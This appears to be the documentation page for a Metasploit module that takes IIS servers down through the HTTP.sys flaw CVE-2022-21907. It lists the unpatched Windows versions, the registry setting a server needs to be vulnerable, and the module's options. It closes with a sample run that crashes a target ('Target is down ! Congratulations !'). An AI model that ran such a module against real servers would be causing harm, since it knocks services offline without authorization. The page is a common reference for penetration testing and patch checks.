## Vulnerable Application

IIS web server without KB:
 - Windows 10 Version 1809 && Windows Server 2019 (include Core): KB5009557
 - Windows 10 (Versions 20H2, 21H1, 21H2) && Windows Server Version 20H2 (include Core): KB5009543
 - Windows 11: KB5009566
 - Windows Server 2022 (include Core): KB5009555

and with DWORD: `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\HTTP\Parameters` value **EnableTrailerSupport** enabled.

![Weak configuration](https://mauricelambert.github.io/vulnerability/images/CVE-2022-21907_weak_configuration.png "Weak configuration")

### Source

 - [Microsoft](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2022-21907)

## Options

### RHOST

 - **Required**
 - Type: **address**
 - *No default value*

Should be the address of the weak IIS server.

### RPORT

 - **Required**
 - Type: **integer**
 - Default value: **80**

Should be the port to open the connection with the weak IIS Server.

## Scenarios

```text
msf6 > use exploit/windows/iis/rb_dos_iis_2022_21907 
msf6 auxiliary(windows/iis/rb_dos_iis_2022_21907) > set RHOST 10.10.10.10
RHOST => 10.10.10.10
msf6 auxiliary(windows/iis/rb_dos_iis_2022_21907) > exploit
[*] Running module against 10.10.10.10

[+] Target is down ! Congratulations !
[*] Auxiliary module execution completed
msf6 auxiliary(windows/iis/rb_dos_iis_2022_21907) >
```

## Reference

 - [Microsoft](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2022-21907)
 - [nvd.nist.gov](https://nvd.nist.gov/vuln/detail/CVE-2022-21907)
